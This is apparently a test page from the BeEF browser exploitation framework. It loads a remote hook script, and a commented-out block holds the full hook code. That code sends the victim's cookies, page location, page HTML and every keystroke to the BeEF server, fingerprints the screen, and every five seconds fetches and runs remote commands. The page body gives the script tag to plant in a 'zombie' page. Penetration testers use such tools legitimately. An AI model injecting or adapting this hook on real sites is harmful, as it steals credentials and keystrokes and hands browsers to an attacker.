<?php
	require_once("../include/common.inc.php");
	require_once("../include/config.inc.php");
?>
<html>
<head>
	<title>BeEF Test Page</title>
	<link rel="stylesheet" type="text/css" href="../css/firefox/style.css">
		<link rel="icon" href="favicon.ico" type="image/x-icon">
		<script  type="text/javascript" src="<?php echo BEEF_DOMAIN?>hook/beefmagic.js.php"></script> 
<!--<script type="text/javascript">

 top.document.onkeypress = catch_key;

if (window.attachEvent) 
    window.attachEvent('onload', beef_onload);
else if (window.addEventListener) 
        window.addEventListener('load', beef_onload, 0);

beef_url = 'http://localhost/bf/';

// ---[ IS_XUL_CHROME
// determing if we are in chrome (privileged browser zone)
function isXULChrome() {
	try {
		// check if this is a standard HTML page or a different document (e.g. XUL)
		// if that is undefined, then catch() will be executed
		var dummy = document.body.innerHTML;
		return false;
	} catch(e) { 
		// if we get here, that means head is undefined so probably not an HTML doc
		return true;
	}
}

// ---[ BEEF_ONLOAD
function beef_onload() {
	return_result('loc', document.location);
	return_result('cookie', document.cookie);
	if( ! isXULChrome() ) {
		save_page();
	}
}

var key_history = new Array(4);
var magic_seq = ['B','e','E','F']; 

// ---[ SAVE_PAGE
function save_page() {

    var a = document.body.innerHTML;
    var begin = 0;
    var block_size = 1000;
    
    while (a.length > begin) {
        return_result('html', a.substring(begin,begin+block_size));      
        begin = begin+block_size;
   }
}

// ---[ CATCH_KEY
function catch_key(e) {
	var keynum;

	if(window.event) { // IE
		keynum = event.keyCode;
	} else if(e.which) { // Netscape/Firefox/Opera
		keynum = e.which;
	} else {
		//TODO handle error
		return 0;
	}

	var keychar = String.fromCharCode(keynum);

	// keep key history
	for(i=0;i<3;i++) {
		key_history[i] = key_history[i+1];
	}
	key_history[3] = keychar;

	// check if history is magic_seq
	var escape_beef = true;
	for(i=0;i<4;i++) {
		if(key_history[i] != magic_seq[i]){
			escape_beef = false;
		}
	}

	if(escape_beef) {
		alert('Controlled by BeEF - http://www.holyshit.net');
	}

	// return key to beef
	return_result('kl', keychar);
}

var sw = screen.width;
var sh = screen.height;
var sd = screen.colorDepth;


// ---[ RETURN_RESULT
// send result to beef
function return_result(action, data) {
	var img_tmp = new Image();
	var src = beef_url + '/hook/return.php?BeEFSession=u2d1f748od0i19pdnvretfdoi0&action=' + action + '&data=' + escape(data);
	img_tmp.src = src;
}
return_result('screen', sw+ "x" +sh+ " with " +sd+ "-bit colour");

// ---[ INCLUDE
function include(script_filename) {
	
	if( ! isXULChrome() ) {
		var html_doc = document.getElementsByTagName('head').item(0);
		var js = document.createElement('script');
		js.src = script_filename;
		js.type = 'text/javascript';
 		js.defer = true;
		html_doc.appendChild(js);
		return js;
	} else {
		//top/root XUL elements are: window, dialog, overlay, wizard, prefwindow, page, wizard

		var xul_doc;
		
		if ((xul_doc=document.getElementsByTagName('window')[0]) || (xul_doc=document.getElementsByTagName('page')[0]) || (xul_doc=document.getElementsByTagName('dialog')[0]) || (xul_doc=document.getElementsByTagName('overlay')[0]) || (xul_doc=document.getElementsByTagName('wizard')[0]) || (xul_doc=document.getElementsByTagName('prefwindow')[0])) {
		
			var js = document.createElementNS("http://www.w3.org/1999/xhtml","html:script");
			js.setAttribute("src", script_filename);
			js.setAttribute("type", "text/javascript");
		 	js.setAttribute("defer", "true");
			xul_doc.appendChild(js);
			return js;
		}
	}
}

// start heartbeat 开始心跳，5000毫秒去请求一次远程的js
setInterval(function () {
	var date = new Date().getTime();
	include(beef_url + '/hook/command.php?BeEFSession=u2d1f748od0i19pdnvretfdoi0&time=' + date);
}, 5000);

// run autorun module 默认的模块，注入一次
// need setTimeout as the DOM element that is grabbed by include() function is not yet there
// our injection may occur before the element is created within the DOM
setTimeout(function () {
	var date = new Date().getTime();
	include(beef_url + '/hook/autorun.js.php?BeEFSession=u2d1f748od0i19pdnvretfdoi0&time=' + date);
}, 2000);
</script>
		-->
</head>
<body>
 <br>BeEF Test Page<br><br>


	The following code needs to be included in the zombie:<br>
	<code>
	&#x3C;script language='Javascript'
	src="http://<?php echo BEEF_DOMAIN;?>/hook/beefmagic.js.php'&#x3E;&#x3C;/script&#x3E;
    </code>
    <br>
    
</body>
</html>
